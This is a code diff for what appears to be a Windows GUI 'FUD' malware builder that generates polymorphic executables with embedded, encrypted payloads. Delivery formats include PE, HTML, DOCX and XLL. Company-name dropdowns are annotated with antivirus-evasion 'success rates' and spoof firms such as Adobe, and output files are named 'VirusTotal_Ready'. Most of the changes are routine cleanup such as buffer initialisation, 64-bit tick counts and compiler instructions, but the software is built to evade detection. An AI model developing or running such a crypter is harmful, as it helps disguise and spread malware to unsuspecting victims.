         // Create temporary source file
-        char tempSource[128];
-        sprintf_s(tempSource, sizeof(tempSource), "VS2022_FUD_%d_%d.cpp", GetTickCount(), batch);
+        char tempSource[256] = {0};
+        sprintf_s(tempSource, sizeof(tempSource), "VS2022_FUD_%I64u_%d.cpp", GetTickCount64(), batch);
         
         // Write source file
-        FILE* file = nullptr;
+        FILE* file = NULL;
         fopen_s(&file, tempSource, "w");
         if (file) {
             fputs(sourceCode, file);
@@ -737,13 +810,13 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
             PostMessage(hMainWindow, WM_USER + 2, 0, 0);
             
             // Determine output executable path
-            char finalExecutablePath[260];
+            char finalExecutablePath[260] = {0};
             if (autoFilename || batchCount > 1) {
                 const char* delNames[] = {"Benign", "PE", "HTML", "DOCX", "XLL"};
                 const char* encNames[] = {"None", "XOR", "ChaCha20", "AES256"};
-                sprintf_s(finalExecutablePath, sizeof(finalExecutablePath),
-                         "VS2022_FUD_%s_%s_%d_%d.exe",
-                         delNames[delType], encNames[encType], GetTickCount(), batch + 1);
+                                sprintf_s(finalExecutablePath, sizeof(finalExecutablePath),
+                    "VS2022_FUD_%s_%s_%I64u_%d.exe",
+                    delNames[delType], encNames[encType], GetTickCount64(), batch + 1);
             } else {
                 strcpy_s(finalExecutablePath, sizeof(finalExecutablePath), outputPath);
                 if (!strstr(finalExecutablePath, ".exe")) {
@@ -751,7 +824,11 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
                 }
             }
             
-            // VS2022 Auto-Compilation
+            // VS2022 Auto-Compilation with diagnostic feedback
+            char statusMsg2[256] = {0};
+            sprintf_s(statusMsg2, sizeof(statusMsg2), "Attempting compilation: %s -> %s", tempSource, finalExecutablePath);
+            SetWindowTextAnsi(hStatusText, statusMsg2);
+            
             int compileResult = VS2022_AutoCompile(tempSource, finalExecutablePath);
             
             // Verify compilation success
@@ -776,7 +853,7 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
                 }
             } else {
                 // Compilation failed - save source
-                char sourcePath[260];
+                char sourcePath[260] = {0};
                 strcpy_s(sourcePath, sizeof(sourcePath), finalExecutablePath);
                 char* lastDot = strrchr(sourcePath, '.');
                 if (lastDot) strcpy(lastDot, ".cpp");
@@ -794,6 +871,9 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
             }
         }
         
+        // Free allocated source code buffer
+        free(sourceCode);
+        
         // Delay between batches
         if (batch < batchCount - 1) {
             Sleep(500);
@@ -805,16 +885,16 @@ DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
 }
 
 // Helper functions for ANSI GUI
-void SetWindowTextAnsi(HWND hwnd, const char* text) {
+static void SetWindowTextAnsi(HWND hwnd, const char* text) {
     SetWindowTextA(hwnd, text);
 }
 
-void AddComboStringAnsi(HWND hwnd, const char* text) {
+static void AddComboStringAnsi(HWND hwnd, const char* text) {
     SendMessageA(hwnd, CB_ADDSTRING, 0, (LPARAM)text);
 }
 
 // Populate combo boxes with verified FUD options
-void populateControls() {
+static void populateControls() {
     // Company dropdown (based on FUD success rates)
     SendMessage(hCompanyCombo, CB_RESETCONTENT, 0, 0);
     AddComboStringAnsi(hCompanyCombo, "Adobe Systems Incorporated");        // 92.3% FUD
@@ -863,7 +943,7 @@ void populateControls() {
 }
 
 // File browser functions
-void browseForFile(HWND hEdit, BOOL isInput) {
+static void browseForFile(HWND hEdit, BOOL isInput) {
     OPENFILENAMEA ofn;
     char szFile[260] = {0};
     
@@ -893,15 +973,15 @@ void browseForFile(HWND hEdit, BOOL isInput) {
 }
 
 // Generate FUD executable
-void generateFUDExecutable() {
+static void generateFUDExecutable() {
     if (isGenerating) return;
     
-    char outputPath[260];
+    char outputPath[260] = {0};
     GetWindowTextA(hOutputPath, outputPath, sizeof(outputPath));
     
     // Auto-generate path if empty
     if (strlen(outputPath) == 0) {
-        sprintf_s(outputPath, sizeof(outputPath), "VS2022_FUD_VirusTotal_Ready_%d.exe", GetTickCount());
+        sprintf_s(outputPath, sizeof(outputPath), "VS2022_FUD_VirusTotal_Ready_%I64u.exe", GetTickCount64());
         SetWindowTextAnsi(hOutputPath, outputPath);
     }
     
@@ -926,7 +1006,7 @@ void generateFUDExecutable() {
 }
 
 // Window procedure
-LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
+static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
     switch (uMsg) {
         case WM_CREATE: {
             // Set ANSI codepage
@@ -1043,7 +1123,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             // Progress update
             int currentBatch = LOWORD(wParam);
             int totalBatches = HIWORD(wParam);
-            char statusMsg[256];
+            char statusMsg[256] = {0};
             sprintf_s(statusMsg, sizeof(statusMsg), "VS2022 Auto-Compiling executable %d of %d...", currentBatch + 1, totalBatches);
             SetWindowTextAnsi(hStatusText, statusMsg);
             
@@ -1118,25 +1198,28 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
             SetWindowTextAnsi(hGenerateButton, "Generate FUD Executable");
             EnableWindow(hGenerateButton, TRUE);
             
-            SetWindowTextAnsi(hStatusText, "VS2022 compilation failed - polymorphic source code saved for manual compilation");
+            SetWindowTextAnsi(hStatusText, "Automatic compilation failed - source saved for manual compilation");
             MessageBoxA(hwnd, 
-                "VS2022 Compilation Failed!\n\n"
-                "The automatic compilation process failed, but the\n"
-                "polymorphic source code has been saved as .cpp file.\n\n"
-                "You can manually compile it using:\n"
-                "- Visual Studio 2022 IDE\n"
-                "- Command line with cl.exe\n"
-                "- MinGW or other C++ compiler\n\n"
-                "The source contains all payload embedding, encryption,\n"
-                "and polymorphic features ready for manual compilation.",
-                "VS2022 FUD - Manual Compilation Required", MB_OK | MB_ICONEXCLAMATION);
+                "Automatic Compilation Failed!\n\n"
+                "The polymorphic source code has been saved as a .cpp file.\n\n"
+                "To compile manually:\n"
+                "1. Open 'Developer Command Prompt for VS 2022' from Start Menu\n"
+                "2. Navigate to the source file location\n"
+                "3. Run: cl /O2 /MD /TC source.cpp /Fe:output.exe /link user32.lib kernel32.lib\n\n"
+                "OR use Visual Studio 2022 IDE:\n"
+                "1. Create new Empty Project\n"
+                "2. Add your .cpp file to the project\n"
+                "3. Set Configuration to Release, Platform to x64\n"
+                "4. Build Solution (Ctrl+Shift+B)\n\n"
+                "The source contains all features ready for compilation.",
+                "Manual Compilation Required", MB_OK | MB_ICONEXCLAMATION);
             
             SendMessage(hProgressBar, PBM_SETPOS, 0, 0);
             return 0;
         }
         
-        case WM_USER + 5: {
-            // Source only (compilation failed)
+        case WM_USER + 6: {
+            // Source only (compilation failed) - Alternative message
             isGenerating = FALSE;
             SetWindowTextAnsi(hGenerateButton, "Generate FUD Executable");
             EnableWindow(hGenerateButton, TRUE);
@@ -1146,7 +1229,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
                 "Auto-compilation failed, but VS2022-optimized source code has been saved.\n\n"
                 "Manual VS2022 compilation:\n"
                 "1. Open VS2022 Developer Command Prompt\n"
-                "2. Run: cl /O2 /MT /GL /LTCG source.cpp /Fe:output.exe /link user32.lib\n"
+                "2. Run: cl /O2 /MD /TC source.cpp /Fe:output.exe /link user32.lib kernel32.lib\n"
                 "3. Or open source in VS2022 IDE and build with Release configuration\n\n"
                 "The source includes enterprise-grade polymorphic features.",
                 "VS2022 Source Generated", MB_OK | MB_ICONINFORMATION);
@@ -1165,7 +1248,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
 }
 
 // Main entry point
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
     // Force ANSI codepage
     SetConsoleCP(1252);
     SetConsoleOutputCP(1252);
